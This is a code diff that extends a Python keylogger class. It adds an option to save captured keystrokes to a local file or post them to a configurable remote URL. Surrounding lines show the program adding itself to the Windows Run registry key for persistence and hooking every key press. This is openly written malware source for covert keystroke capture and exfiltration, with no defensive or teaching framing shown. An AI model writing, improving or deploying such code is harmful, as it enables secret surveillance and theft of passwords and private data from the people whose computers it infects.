@@ -6,9 +6,11 @@ import subprocess
 import sys
 
 class Keylogger:
-    def __init__(self):
+    def __init__(self, url=None, offline=True, file_name="keys.txt"):
         self.path = Path(sys.argv[0])
-        self.url = ""
+        self.url = url
+        self.offline = offline
+        self.file_name = file_name
 
     def startup(self):
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -31,7 +33,11 @@ class Keylogger:
             else:
                 return
         
-        requests.post(self.url, key)
+        if self.offline:
+            with open(self.file_name, "a") as f:
+                f.write(key)
+        else:
+            requests.post(self.url, key)
     
     def connect(self):
         while True:
@@ -42,6 +48,8 @@ class Keylogger:
                 pass
     
     def main(self):
-        self.connect()
+        if not self.offline:
+            self.connect()
+
         keyboard.on_press(self.on_press)
         keyboard.wait()
